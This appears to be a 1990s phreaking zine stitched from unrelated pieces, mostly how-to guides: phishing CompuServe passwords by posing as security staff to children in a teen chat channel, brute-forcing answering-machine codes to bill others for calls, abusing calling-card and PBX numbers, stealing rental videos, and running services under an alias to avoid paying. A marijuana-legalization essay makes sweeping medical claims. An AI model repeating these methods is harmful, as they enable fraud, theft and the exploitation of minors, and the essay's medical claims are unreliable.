This one beats all the other pussy texts on hacking compusrv.. Those other
ones are soo lame, with like 50 extra bbs ad's, to make it about 1 meg, when
the text file is only about 10k... Well fuck that, do this, I can garuntee
that you'll get some GREAT accounts.


This method will stretch out your Social Engeneering Capabilities. (Basically
bullshit lamers into their passwords)  1st get a fake trial account there..
Just take a form out of a new modem box and get the free compuserv for a 
month deal, form.... Oh yea, to use those you'll need weird shit like a
bank routing #, transit #, check #, bank name/#..... Also the other basics
like

1.> Real fake name
2.> Real fake address
3.> Real fake city/st/zip
4.> Real fake phone #/data #

Call up compusrv and once your all logged on type 'go cb' when you get logged
into the CB simul8r.  When your on the CB goto the general band, then I belive
it is channel 17 (Teen Dorks).  On there, when it asks for your handle, you
will want to say a handle then [HELPER].  Use MIRROREYES, some dork i've 
scammed about 1 million accounts with.  (yeah he is a real guy).  So it would
be MIRROREYES[HELPER] all in caps like so.  Once on the teen channel, well
you know how they are always saying shit like 16/f and 10/m... Well find 
some gullable 14/f or 10/m and (lets say there channel is #10) the conversation
would go something like this:


You :  Hello, this is Joe Crawford, from Compuserve Security Department, wing
       19, we are sorry to inform you, but there are security breaches on 
       your account


Dork : Oh really? Like what


You :  Well have you been using your account extensively for many hours at
       a time, for the last 3 weeks?

Dork : No... Ive been away

You : Ok, well, we can set you up with a new ID and Password, but first We
      need to verify some information from you

Dork : Shoot

You : Name, Address, City, State, Phone, ID (even tho its in front of you), PW

Dork : Felix Johnson, xxx, xxx, xxx- 75053,1122 - PW: cleanse*butthead

You  : Ok, thank you Felix, that information has been verified, you will get
       a form in the mail, within the next 4-6 weeks confirming your new 
       account.  Until then, you have a security block on your account.  NO
       one can call except from your phone #

Dork : Great thanx.

E*O*Conversation

You'll have that account for about 2 - 3 months before they catch on the bill
is twice as much as it should be

                        by Pliny The Elder     

     I believe that marijuana should be legalized. It has proven
medical uses, and has proven to be the "safest" mind altering
substance you can put in your body. Marijuana has uses for
commercial, medical, and individual interests.
     Marijuana is an Indian hemp plant which can grow just about
anywhere and has been found growing in Arctic regions, the rain
forests, and even in city dumps. It's scientific name is cannabis
sativa which comes from the Latin word for hemp and sativa which
means planted or sown (Leiberman 32). Marijuana was illegalized
in 1937, for mostly political reasons (The Benefits of Cannabis
1).
     Hemp is a renewable natural resource that yields the raw
materials essential for more of our necessities and convinces
than any other crop. Hemp grown on land in the United States that
is not currently forested or used for agriculture can meet all of
our oil and gas fuel needs. Twelve to thirty-eight million acres
of hemp would provide enough fuel for all of our transportation
use. This would mean $0.60 to $1 per gallon fuel cost to the end
user. One ton of American grown hemp can be converted to more
than two barrels of methanol. It is estimated that marijuana can
yield ten to thirty tons per acre. Using hemp to generate fuel
has several advantages over current fuels. Hemp, unlike
petroleum, is grown as a crop, so it's a renewable energy source.
All fuel products produce carbon dioxide when burned. Some argue
that carbon dioxide is contributing to the "greenhouse effect"
which is gradually warming the planet. Marijuana is a fast
growing crop which effectively converts carbon dioxide back to
oxygen (America's Family Farms). Charcoal, pyrolitic oil, gas, or
methanol can be produced from cannabis hemp. Burning charcoal
does not cause acid rain (Pulp & Paper 7).
     Marijuana is one of the best cash-crops that a farmer can
grow. It is a rugged plant which has strong roots that help to
anchor the soil to prevent erosion. Is requires less water,
fertilizers and pesticides than do other food and cash crops like
corn, cotton, and tobacco. Hemp leaves drop throughout the
growing season, helping to add to the fertile topsoil and helping
the soil retain it's moisture. Depending on how closely together
the seeds are sown, hemp can help protect seedlings, or block
sunlight to eliminate weeds. Hemp is also a good crop to rotate
with other crops, since it helps fertilize the soil, and doesn't
require a lot of chemicals which poison the earth (America's
Family Farms).
     Cannabis hemp is the longest, most durable, and longest
lasting natural fiber known to exist on the Earth. Ninety percent
of all ship sails were made from hemp fibers since the birth of
Christ until the 1930's. Virtually all canvas paintings were
painted on cannabis hemp linen canvas. Ninety percent of all rope
and twine was mode from cannabis hemp until 1937 (The Benefits of
Cannabis 1). Seventy-five to ninety percent of the world's paper
manufactured before 1883 was mode from hemp fiber, including the
first two drafts of the Declaration of Independence. In 1916, the
United States Department of Agriculture predicted a papermaking
future for portions of the hemp stalk. They stated "Hemp hurd
stock acts similarly to soda-poplar stock, but will produce a
somewhat harsher and stronger sheet and one of higher folding
endurance." A three page article appeared in the February 1938
issue of Popular Mechanics entitled "The New Billion Dollar Crop"
which described a breakthrough in removing the fiber-bearing
cortex from the rest of the hemp stalk. The article stated "If
federal regulations can be drawn to protect the public without
preventing the legitimate culture of hemp, this new crop can add
immeasurably to American agriculture and industry." Hemp can
produce four times the amount of paper per acre than 20 year old
trees and will grow anywhere in the 48 contiguous states (Pulp &
Paper 7).
     For more than 3,500 years marijuana has been one of the most
widely used drugs in oriental medicine. From 1842 to the 1880's,
marijuana was one of the most often used drugs in the United
States to treat the illnesses of adults and children. Recent
research (1966 through 1976) reconfirms marijuana to be the
medicine of choice for glaucoma, epilepsy, muscular spasms,
reduction of tumors, control of nausea in cancer chemotherapy,
emphysema, migraine, depression, and anorexia nervosa. Ninety
percent of glaucoma victims can benefit from the use of
marijuana. Marijuana is two to three times as effective as any
currently legal medicines for reducing ocular pressure, without
toxic side effects associated with legal glaucoma drugs.
Marijuana is also one of the best dilator of the bronchi and
bronchoiles, opening them up to allow more oxygen into the blood 
Medical research indicates that light marijuana smoking would be
the therapy of choice for mild emphysema to allow more fresh
areas of the bronchi to open up for more oxygen transfer. All
research into the oxygen transfer effects caused by marijuana
indicates that chest pains, shallowness of breath, headaches,
etc. which are symptomatic of heavy smog exposure are usually
alleviated by light smoking of marijuana throughout the day.
Marijuana is the best natural expectorant to empty the lungs of
smog. It's estimated that marijuana would replace more than fifty
percent of Valium, Librium, and Stellazine. Marijuana is
currently the best way known to dry one's mouth for dentistry;
and if legal would replace the highly toxic Probanthine.
Marijuana is also the best relaxant and back spasm medicine
available short of morphine (The Benefits of Cannabis 2-3).
     Even if the beneficial effects of marijuana are ignored for
a minute, the question of legalization is still an easy one. No
government, federal, state, or local has any right to tell any
man what he can or can not do to his body. It is possible that
the government has a responsibility to educate the public about
substances that might be harmful to them. It might even be
arguable that governments have a right to protect people from
dangers that they can not perceive, such as dangers from a
pesticide. Instead of letting the populace decide for themselves,
the United States government is deciding for them. The government
is saying that they don't trust John Q. Public to make up his own
mind, and that they must remain every vigilant over him to
protect him from every possible harm in the world. The United
States Government apparently doesn't want a free thinking society
where people can make up their own minds. Aspirin causes hundreds
of deaths a year. During the entire record of human existence,
not a single death has been caused by cannabis (Young 1).
     The benefits of legalization of cannabis sativa are nearly
innumerable. There has not been a single death related to hemp in
all of recorded history. What possible reason can anyone give to
deny the citizens of the United State's right to use God's great
gift to the fullest? Sure, the chronic smoker won't get a
completely free ride, but they know that and it is their
decision. Hemp must be legalized for commercial and medicinal
purposes and the purposes of the individual. Who will deny the
human race the great benefits that can come from this mighty
herb?

  ---------------------------------------------------------------------
  Welcome to the wonderful world of answering machine hacking, to start
  ill  first  tell you a bit about what the hell the purpose of hacking
  answering machines is.  Here is some purposes :
                            
        1  Free Calls (3rd party) 
        2  Chicks Dig It              
        3  You can use it as a code line

To find an answering machine, you need the IQ of a dog (in other words
Coventry, dont bother).  Once you find it, and start hearing the message
hit *, if that works and it brings you straight to the BEEP, then krad, yer
set..  If not, dont bother hacking it, it wont even let you access it remotly.
A good answering machine to hack is (518)383-1111 Jesus, i must have cracked
that guys code 400 times, everytime he'd change it, id get it :>  Now most
answering machines are only 2 digit passwords, some 3, and a very tight
security (which really isnt needed for an answering machine) would of course
be 4 digits...  Once you hear the beep to start recording, start with 00, dial
like this

(Oh yeah, a big button phone for blind people is suggested for this way)

Pattern for haking ans. machinez
--------------------------------
00 01 02 03 04 05 06 07 08 09 10
11 12 13 14 15 16 17 18 19 20 21
22 23 24 .................... 99

Keep listening closly to the earpeice while you dial these..  You should hear
another beep, then the messages that were previously recored playing backwards
After a few sex, if you hit a good one, it will have a audiomated voice, spi-
tting out options. Like * for help, 1 to hear messages, 2 to delete messages,
3 to Change outgoing announcment, 4 to logout (Alltho not in those exact werds)
Heres where the making free calls comes in... Hit the number that you hit to
change outgoing announcment, when you hear another BEEEPPP then say EXACTLY
this.

'  Operator I except all 3rd party and Collect Calls  ........ Hi this is
   <name> at <the # of the hacked house> please leave a message            '

Then it will save (usually, unless told otherwise, Earlier)... The very great
thing about this shit is, that if you call the operator and say 'Id like to
make a 3rd party call to (npa)xxx-yyyy, my name is Rick'  They will call and
say 'The party verified, thank you for abusing AT&T <click> '  Whala Yer
connected 4 free..  Even tho there bill will say

'3rd party bill from (yer)num-ber to (cal)led-party'  You CANNOT and i repeat
CANNOT get introuble, say you didnt do it, AND even if they prove it, THEY
ACCEPTED, what the fuck can they do!?!?!?!?

You can use it as a code line, if its 8oo, which are kinda hard to comeby,
but still cool

Enuf with this....

        Lately in the past few months or so I have noticed a rather large 
ammount of Prepaid Calling Cards being distributed. A Prepaid Calling Card
is A Calling Card that all you do is pay for it and it has a special ammount
of time slotted. I thought this would be a particularly useful topic to write
about since it can aid all phreaks and hackers. Lets say I went to Joe Store 
and gave them $15. In return I would most likely recieve a 10 or 15 minute 
call card. In this article I am going to focus on mainly a few that I happen 
to know some about. I have only seen PCCs in intervuls of 7, 10, 25, 30, and 
90 minute cards. And all of these cards have 1 thing in common. An annoying 
as hell bitchy voice comes on when theres one minutes left on your PCC and 
tells you that. That fucks up any modem connection if any. Plus all of these
service are open 24/7.
        
        Theres a new company called Talk 'N Toss. They are offering 30 minute
and 90 minute call cards to resalers. So if you wish to place an order to 
sell them at your business dial their customer service toll-phree hotline.
(800) 631-8895. Plus i'm sure you can SE the lady into getting free cards. 
I've done it once so it can be done. This call doesn't appear on your phone
bill. They say it saves 38% from a normal AT&T Call Card.         
        
        I have seen these selling only two places. The first is a grocery 
store in Colorado called Albertsons. I don't know if this grocery store is 
only in Colorado, but thats just where I have happen to run across it. The  
other is Revco drugstore formerly Brooks. They have 10 minute card for $3.99 
and a 20 minute card for $9.99(?) and a 30 minute call card goes for $9.99 
there, and a 90 minute phone card goes for a whopping $24.99. Deal or not?
If you want to fuck with 'em call (800) 213-0304, in the form XXX-XXX-XXX.
With the customer service # at (800) 354-2708. 

        Marvel Comics and Kay-Bee toys have put together a deal to sell 20
minute X-Men calling cards. They have 4 so called limited edition cards with
some wussy's fighting on the front. On the back there is a card and a scratch
off area to see the card number. To further expirement call (800) 616-8883.
The cards are 9 digits long.

        Champs Sporting Goods Store has a new deal where if you purchase over
$35 worth of shit you get a free 7 minute call card. 7 minutes basically 
ain't worth shit. But for some things it is. The number is (800) 437-6404.
The cards have 9 digits in the form : XXX-XXX-XXX.

        Randomly inserted into Classic 4-Sport, sports cards are Sprint 
100,000 Prepaid FoNCARDS. Now what the fuck would some baseball card do with
a Prepaid FoNCARD? I still haven't figured it out. But Sprint has some deal
with Classic Games Inc. The odds of finding a Sprint FoNCARD is 1:72. I don't
know for how many minutes they are for or how many digits they are. But If
I find anything I'll keep you posted. 

        Again Classic is trying to offer something to the collector again. But
this time it's about real money. Not opening a $1.50 pack of cards. They're 
now offering 1, 5, 10, 20 and 1000 dollar cards to dealers. These are such hot
commodities that the prices double every quarter! So I asked some ripoff 
artist what the deal was on getting it he said for a $1000 card you must pay
a $750 downpayment with a max order of 1. But the rest you have to order 18
cases of the rest to order them wholesale. That's 108 cards a case. But I'm
sure you can find them singular. Try looking in your local sports page for
adds for Sportscards conventions.

        Attention sports fans once again. GTE is offering 25 minute call cards
that look like actual calling cards. But these cards you can order with any
proffesional football team helmet logo on the front of it. They call these
"NFL Collectibles". But the minimum order is 2 cards. Plus then they send you
a 5 minute bonus card that features helmets from all 30 NFL teams. To order
each card is only $14.75 but you have to get 2. Call 1-800-GTE-3804 in the
US. And outside the US call (303) 743-4138, extension 712. Or just fax 
(303)-727-4994. You must order these with a credit card. I saw this add in
Sports Illustrated.

        Hallmark is also working with Sprint to rip you off for the Christmas
season. They have 10 minute call cards which are poly-wrapped inside greeting
cards. Now for the Christmas season they have tighter wrapped Christmas Call
Cards. These sell for $5.95 at you local Hallmark store. But I happen to like
these cards the best since they're easier to ripoff. Go ahead hack some.
(800) 504-1115, or for the same plus a Happy Holidays greeting call 
(800) 203-1225. Either way it works. They are 10 digits in the form :
XXX-XXX-XXXX. Their customer service/questions toll-phree hotline is 
(800) 516-2121. You can only call US plus US territories.
        
        Pepsi Cola company is the stupidest asses for printing the phone # 
for their calling card system on the back of any 12 pack box. Pepsi offers 
the shitiest cards but spent the most on advertising. They have a 5 minute
calling card randomly inserted into Pepsi Holiday 12 packs. So just call up
s(800) 929-COLA or (800) 929-3652 (same) and it says "Enter Your 14 Digit 
Code". It's just asking to be ripped off. But if you think a Hallmark 10 
minute card isn't worth it then fuck this idea.

        7-11 the slurpee guys are now working with AT&T to bring you their
7-11 Phone Cards. It's supposed to save 50% or more. Now I know this is a big
crock of shit. On the brochure it shows a data table comparing a 3 minute call
from LA to NY. It says a 7-11 Phone Card is $1.00, Collect Call is $3, a 
Payphone is $2.70, and a Call Card is $1.70. I know when I call LD it's only
like 15 or close to the cents a minute, not this ripoff. They are available
in 15, 30 or 60 minute cards. I found a nice sales pitch on the brochure. It
says "After your time is used up, the card becomes inactive and you just buy
a new card!", yeah right. With this card unlike the Hallmarks you can call
international. But this call must originate from within the US. But since
international rates vary a 15 minute card could only be 5 minutes. They don't
actually give you that ammount of time. It depends where you call. It's just
setup so you have a certain ammount of money credit and once that's used fuck
how many minutes are left your time is up. Remember when you want a 7-11 card     
it is always best to ask for Habib.

Here is a list of those #'s and how many digits your supposed to use.

Question:

So you want to be able to go to just about anyvideo store or grocery store
and get some free movies and video games that are NEVER due back?

Answer:
Hell Yeah, read on.

There are 2 ways to pull this one off. At places where you either :

<.1.> Return Videos To Countertop
<.2.> Return Videos Through Dropslot
<.3.> Stand Outside While Pretending To Work There

<.1.> Return Videos To Countertop

First find a place where you can rent movies or games. Video stores are the
first and easiest targets. Grocery stores are up there to. You want to find
a video store where when after a person rents a movie they have to set it
on a countertop and a person who works there will pick it up and put it back
when he/she has time. Most people who work at video stores are either bored
to death or overwelmed with work. You don't want to be in a place where the
clerk is watching Benji Comes Home 24/7. You want a nice quick busy paced
atmosphere. Now the good part.

When a person finished their movie/game and set it on the counter the person
has go to the area to put it back. But it theres people trying to take out 
movies at the same time they do it once the active customer is finished. 
That's where you come in. Hang around a video store for a while so you get 
used to the atmosphere in a way. Find a good area to pretend to be looking
at movies but where you can see the cashier and renter. Pick a good time.
From 7PM to closing is usually one of the best. Once you have atleast a 2 
person line and a pile of videos starting to build that's where you mosey 
on over. You don't have to be stealth just act like your looking at the 
videos recently dropped in. If anything looks semi-interesting just slowly
move your hands with the video in them down to under the counter where the
dude behind it can't see the flick you have in your hands. Now you won't get 
caught, turn around and walk to some other section of the store. Place the
article of viewing anywhere in your clothing you want to. Then just get out.
I have found this work mostly. The key thing is all in the right timing. Once
you get the goods you can watch them, sell them or burn them.

<.2.> Return Videos Through A Dropslot 

Now this method is still easy but it takes a little more brains. There are 2
kinds of dropslots. The first is a downward slot through somewhere in a 
counter or table where the stuff drops into a box or something. Where the
second is a little door you open then drop the videos in, plus you have to be
able to see the pile of videos on the bottom. 

In the first dropslot situation you can find something like a little piece of
wood or metal you can slip in to stop videos from going all the way to the
bottom. Then once they have put their shit on in you can just reach in and
take 'em. Another idea is take a hanger and unfold it so it's straight and
position one side so it sort of locks around one edge and wedge it down so 
it'll stop the flow of videos, then hook the other side to the other edge.
So that will catch them also.

Here is a diagram demostrating how you can fit something in to stop the flow
of videos. The rectangle in the middle is the dropslot, and the thing between
it is the hangar. I have it at a slant to you can better picture it.

<.3.> Stand Outside While Pretending To Work There

Get a fairly large cardboard box and write video drop on it in marker. If 
this store your going to victimize has nametags, then make one with an alias
on it for you, or steal one. This betterly works at videostores, not really
other places. I don't recomend trying this in cold weather. 

Stand outside and as customers walk to the door tell them that your doing a
complementary service and collecting videos outside so they don't have to go
inside. If they say they're going inside anyways it's best to shut your 
mouth, because you don't want people complaining about a fake employee. With
this method collect as much as you want until you hear sirens.

Delrina Fax MailBox Add:

No matter where you are, where your're headed, or what time it is, you can 
now be certain you'll get every fax people send you Ä- even if they don't 
know where to find you. With new Delrina Fax MailBox service, it's easy. In 
fact, we're so sure you'll agree, we're going to give you one month of 
service and 10 fax pages free. Now, confidential and reliable fax storage is
just two easy sets away.

number (which we give you) and it goes. Then Fax MailBox recevies and stores
it for you electronically until your ready to retrieve it.

4.0 software, and retrieve your fax with a simple click of the mouse. Or use
a fax machine, enter your password, and print it on the spot. It's that easy.
Just think of Fax MailBox as voice mail, but for faxes.

Call today and sign up for Delrina Fax MailBox and you'll start getting all
your faxes ÄÄ for a change.

        Basically what this system is a VMB but for faxes. So it's a FMB. 
What you can do with this is have someone send your FMB a fax and you can 
call enter you password and retrieve it. It can be good for hackers so you 
can have the back and forth exchange of elite information.
        You can call that number for the a month free. If you register it to
an alias and tell them not to call you or give them a number that's always 
busy. Remember this your service is only cut off when you cancel it. So your
service can keep on going and going and going with bills being sent to your
alias. 
        Once I ran across a Delrina Fax MailBox number by accident, here it 
is. 1-800-368-9414 and then the next few numbers are assigned to it. You can
try to hack the password. (That whole 1-800-369-94xx is loaded with these) 
Each member gets their own 800 number an operator told me.
        I basically know a little but this is good enough for someone to 
start out on.

This is an IVX500 Voice Mail Users Guide. I know someone that recently 
purchased this system for his office and I got a handy manual. So I 
read it over and decided certain things just needed to be known. But 
when I told most people that I was typing this up they thought it would 
be close to a 6,000 page document, like a Meridian Mail. But this system
is just as efficent and you will find all of the command listed below.

<.1.> Introduction To IVX500 Voice Mail

The IVX500 System has a Voice Mail feature that allows callers to send and 
recieve recorded messages from any station or touchtone telephone. (Callers 
using dial-pulse phones can be routed to the operator for assistance)

Stations users and outside callers reach Voice Mail in the following ways:

ş By dialing the telephone number or extension number assigned to the Voice
  Mail application.

ş By being transferred to Voice Mail by the automated attendant.

ş By being forwarded (using manual or system forward) to Voice Mail when a 
  called station is unavailable.

ş By responding to message waiting indications left by Voice Mail at a 
  station. (Not available with some telephone systems and station instruments)

When you reach Voice Mail, you wil hear recorded instructions that tell you 
what to do next. Simply listen to the prompts and press the keypad key that 
corresponds to the desired choice. If you do not respond immediately, a second
set of prompts is played.

Most prompts are interruptible, and you can press the desired key at any time
during the prompt. The prompt will then stop and the system will act on the
requested choice.

Each Voice Mail user can be assigned a unique Voice Mailbox number. There are
three types of mailboxes: Standard, Receive-Only, and System Administrator.

ş Standard mailbox features include: listening to new messages, sending 
  messages, forwarding messages, deleting messages, saving messages, 
  programming personal options, and if authorized through database programming
  setting up remote messaging.

With most telephone systems, your station is signaled when your mailbox gets
a message. If you have a keyset the MSG key lights and the display shows that
a message ha been received. If you have a single-line set, the MSG key lights
and you hear message waiting signals(ie 6 tones) when the handset is lifted.

NOTE: Message waiting indications (lights, displays and signals) may not be
available on certain telephone systems and station instruments.

If your station has more than one associated mailbox, the message indications
will continue until all messages from all associated mailboxes have been 
heard. However, the display does not show which mailbox has recieved the msgs.

        Recently I was trying to call up Hallmark on their Holiday Greeting
line to use their Prepaid Calling-Card service. But I couldn't remember the
number. I knew it was around (800) 203-12xx. So I tried 35 as the xx. Which
I was sure would work and I hear the sweet sound of the Allnet operator's
recorded voice echoing through my phone "Please Enter Your 4 Digit PiN". 
Hmm, I thought sounds like a PBX. I didn't know anything about it at first 
until I entered 9999 as the PiN. When the operator's voice echoes "Thank You"
So right now I'm feeling pretty good I found a PBX and got the code on the 
first try. Well it wasn't the right code I wanted. It forwared me to Allnet's
Customer Service Automed System. Once you get to this hit 2 for the real 
automated service. On that you can find out your account balance with your
Allnet account number which if you can hack can get you free calls through
their extender which I will explain later in this article. You can also find
out find out dialing sequences for dialing domestic and international. Plus
some other useless shit like finding out mailing addresses to where to send
you bills. This service can be reached without going through a PBX by calling
(800) 536-3273.
        Now back to the PBX hacking. After that customer service discovery I
tried a number. Then I hear enter my 4 digit PiN again. The second try I did
it again and hear "One Moment Please". I thought jackpot. But then hear 
"You must enter a valid Pin for placing your call". Rats foiled again. Thats
how I knew it was a PBX. I was thinking how lucky I was to have found a PBX
for a mass telco so luckily. Little did I know theirs a million of these 
around. And some are fucked up so after entering 2 invalid pins it transfers
you to someones residence! Incase your wondering one of those numbers is
(800) THE-KRAD (843-5723). At the end of this article will be a small list of
numbers for this service.
        For their extender just dial on up (800) 783-1444. Then with your          
touchtone phone dial that numbers. Then at the first single tone dial 
0-NPA-PRE-SUFF. You can call international. Then at the second double tone 
enter your 11 digit Allnet account number and your call will be billed to 
you Allnet account.

                      A Simple MCi Code Hacker By Substance

Check this prog out, i wrote this with some spare time, you should substitute
your correct comport for the comport given defaulted.  Exaclty what this will
do is, call the 95o-1o22 # (For MCi's PBX) and dial in a random MCi Code
(excluding starting 0's and 1's) Then will dial a # that will never be busy
with a modem obviously (like i think it's compusrv) Then wait a few sec's.
If it see's the word CONNECT it writes the code to file.  All tho this isnt
the most accurate way of hacking MCi codes, this has about a 10 out of 100
chance of getting home.. Try it out, if your not completly satisfied, fuck off

 ->ş What are BTR Shorts?
     
     BTR shorts are pieces of info that are too small for their own article
     therefore their short pieces. Hence the name shorts. If you can submit
     a short send to AWoL [518] 383-1369.

 ->ş Isn't Pilgrim Telephone (a New England Based Telco) pretty arrogant 
     about their collect calling service? I think so.
     By calling 
                [800] 382-5288 or [800] FUCK-ATT and
                [800] 382-5624 or [800] FUCK-MCI 
     
     You hear a duck quack really loud then you Pilgrim Telephone introduces
     themselves, then you hear "Enter The Number You Wish To Call" Then enter 
     ACN and then it'll ask for your name say "Dick" and it'll call that # 
     and ask if they'll accept a collect call from Dick. Without you hearing 
     the operator + person conversation.
 
 ->ş If you want a sure fire way to red box that always works then listen up. 
     In order for this to work you have to have a properly recorded tone. By
     dialing up any 10xxx (tenex) code plus 1+ACN. Then it asks you for a 
     shit load of money. Like $1.35 for a local call. But since it isn't 
     monitored theres nothing there to monitor how many coins have been 
     dropped in.

     True or False you can always make free calls from a Cocot?
     
     In the words of OJ Simpson, Absolutely, Positevely 100 percent TRUE.  
     If your waiting for DT trick doesnt work then use your autodialer or
     keypad. But if that doesn't work call up the operator (0) then ask for
     a long distance carrier, ie : ATT. Then say I need assistance in a call
     say the #, you can't do 900's but you can do 800's and LD, + INTL. That
     usually works. Sometimes that even works on badly programmed Bell 
     phones.

 ->ş HEMP CAN SAVE THE WORLD!
     Cannabis hemp is known today primarily for its widespread use as a 
     recreational drug: Cannabis flowers when smoked or ingested produce
     euphoric effects. Current gross domestic sales of marijuana are 
     estimated at $30 billion...
     What is less well known is that hemp is an invaluable and enviromentally
     friendly resource in many other areas as well. For example: "One acre
     of hemp will make the same amount and quantity of paper as four acres
     of 20 year old trees without the need for chlorine in the bleaching
     process, creating no toxic dioxin pollutants."
     When mature, hemp is the toughest natural fiber known; demin was 
     originally made from hemp sailcloth; canvas take its name from the 
     word Cannabis (Canvass).
     Hemp can also be used as a fuel. Old USDA reports show Hemp gives 4-10
     times the yield of cellulose per acre compared to corn. Modern 
     methods of converting cellulose to methanol make this a viable and
     pollution free method for powering cards, trucks, buses, etc.
     Equally important are the uses of Hemp for food and medicine. Cannabis 
     seeds yield as much edible oil per acre as sunflowers do; the pressed
     pulp is second in protein only to that of soy beans. Federal regulations 
     in the US prohibit research into additional benificial effects, however
     cannabis is well known to be helpful fro glaucoma, asthma, anorexica
     and stress, potentially replacing half the prescriptions written today.
     And , "...there are simply no credible medical reports to suggest that
     consuming marijuana has caused a single death...". Too bad the same
     can't be said of alcohol or tobacco.
     Today there is growing support for taking the 'crime' out of Cannabis.
     US DA Judge Vaughn Walker notes, "I make no bones about my personal 
     view that the best course of action for us to take is exactly the same
     course of action for us to take is exactly the same course we took 
     after prohibition. And that is decriminalization."

  LSD BUSTED!
  The Liquid Sky Datacom (internet LSD.ORG) is no longer. Sysops Baxter &
  Die Warzau are in jail for letting users post valid CC's in the Cardings
  section. Too bad, LSD was advertised in 2600 mag, had it's own Voice Mail
  System, 3 28.8, and lots of hardware. Shit load of money down the drain.
  I don't know anything else like sentencing because I didn't see the news
  paper article since I don't get that paper.

  A Public Service Announcemnt:
  
  To all lamers that call the 2600 Voice BBS and don't post shit :
  
  Hello? Are you alive? The thing is lame but it could be very good. It
  is busy just about 24/7. With only about 3 or less posts a day. I think
  that fucking sucks. So if you call you better have something to say.
  
  We Hope you liked this issue of BTR. See you soon. BTR has no deadlines but
  usually comes out from every 1 month to every month and a half or so.
